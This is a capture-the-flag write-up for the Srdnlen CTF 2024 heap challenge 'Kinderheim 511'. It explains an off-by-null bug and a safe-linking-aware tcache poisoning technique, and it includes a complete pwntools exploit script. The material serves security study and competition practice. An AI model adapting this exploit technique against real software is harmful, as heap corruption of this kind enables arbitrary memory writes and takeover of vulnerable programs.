# Kinderheim 511

## challenge information
Surdnlen CTF 2024: [challenge](https://ctf.srdnlen.it/challenges#challenge-13)

`pwn heap 59 solves`
> Long live the expo. No wait, I mixed that one up.
> This is a remote challenge, you can connect to the service with: nc k511.challs.srdnlen.it 1660

## analysis
* vulnerability
  * there is an off-by-null vulnerability  in `implant_user_memory`.
![Screenshot_20250121_120920.png](Screenshot_20250121_120920.png)
  * there is also a vulnerability in `erase_memory`
  * the slot list will not be initialized if there is memory whole.
![Screenshot_20250121_122340.png](Screenshot_20250121_122340.png)
  * exploit flow
    * heap leak
      * alloc 0x40
      * alloc 0x10
      * free 1
      * free 2
      * reallocate 0x40
      * recollect_memory 2
    * tcache poisoning
      * create chunk
      * create chunk
      * remove first chunk
      * reallocate chunk with off by null and rewrite the size of next chunk(0x10 + `inuse flag`).
      * create chunk
      * remove reallocated chunk
      * reallocate chunk with off by null and rewrite the size of next chunk(0x30 + `inuse flag`).
      * the previous operation concat 0x10 chunk and next 0x20 chunk.
      * remove the next of reallocated chunk
      * reallocate chunk and overwrite the next by (heap-base>>12 ^ slot-list)
      * then, tcache will create in the slot-list
      * reallocate with padding and flag address

Why overwrite the next by (heap-base>>12 ^ slot-list) is safe-linking.
```c
/* Safe-Linking:
   Use randomness from ASLR (mmap_base) to protect single-linked lists
   of Fast-Bins and TCache.  That is, mask the "next" pointers of the                                          
   lists' chunks, and also perform allocation alignment checks on them.
   This mechanism reduces the risk of pointer hijacking, as was done with
   Safe-Unlinking in the double-linked lists of Small-Bins.
   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with
   larger pages provide less entropy, although the pointer mangling
   still works.  */
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
```
heap information after rewrite size of chunk (0x21 -> 0x11) by off-by-one vulnerability.

![Screenshot_20250122_142045.png](Screenshot_20250122_142045.png)

heap information after rewrite size of chunk 0x11 -> 0x31
as you can see, purple area's size is 0x31, but purple area+0x30 is located at the next chunk.

![Screenshot_20250122_142220.png](Screenshot_20250122_142220.png)


## solver

```Py
from pwn import *

e = ELF("./k511.elf")
p = e.process()

gdb.attach(p,"""b *main+150
            set max-visualize-chunk-size 0x300
           """)

def create(content: bytes)->int:
    #p.recv()
    print(p.recv())
    p.sendline(b"1")
    p.recvuntil(b"Input your memory (max 64 chars).")
    p.sendline(content)
    p.recvuntil(b"Memorized in slot ")
    slot = int(p.recvline().decode().replace(".","").strip())
    return slot

def delete(slot: int):
    #p.recv()
    print(p.recv())
    p.sendline(b"3")
    p.recv()
    p.sendline(str(slot).encode())

def show(slot: int)->bytes:
    #p.recv()
    print(p.recv())
    p.sendline(b"2")
    p.recvuntil(b"require.\n")
    p.sendline(str(slot).encode())
    p.recvuntil(b"\"")
    res =  p.recvuntil(b"\"",drop=True)
    print(f"show({slot}): {res}")
    return res

def main():
    create(b"1"*0x3f)
    create(b"2"*0xf)
    delete(1)
    delete(2)
    create(b"3"*0x3f)
    heap_leak = u64(show(2).ljust(8,b"\x00"))
    heap_base = heap_leak * 0x1000
    slot_list = heap_base + 0x2a0
    log.info(f"heap_leak: {hex(heap_leak)}")
    log.info(f"heap_base: {hex(heap_base)}")
    log.info(f"slot_list: {hex(slot_list)}")
    create(b"4"*0xf)
    create(b"5"*0x27)
    num0 = create(b"6"*0x10)
    delete(4) #delete "5"*0x27
    num1 = create(b"7"*0x28+b"\x11\x00")
    num2 = create(b"8"*0x17)
    num3 = create(b"c"*0x17)
    #num3 = create(b"b"*0x17)
    delete(num1)
    create(b"9"*0x28+b"\x31\x00")
    delete(num3)
    delete(num2)
    delete(num0)
    #delete(num3)
    num4 = create(b"a"*0x20+p64(heap_base>>12^slot_list))
    #delete(num4)
    #create(b"c"*0x18+p64(0x21))
    create(b"PADDINGPADDING")
    create(b"DEADBEAF"+p64(heap_base + 0x330))
    create(b"PWNAGEPWNAGEPWNAGE")
    show(1)
    p.interactive()


if __name__ == "__main__":
    main()
```
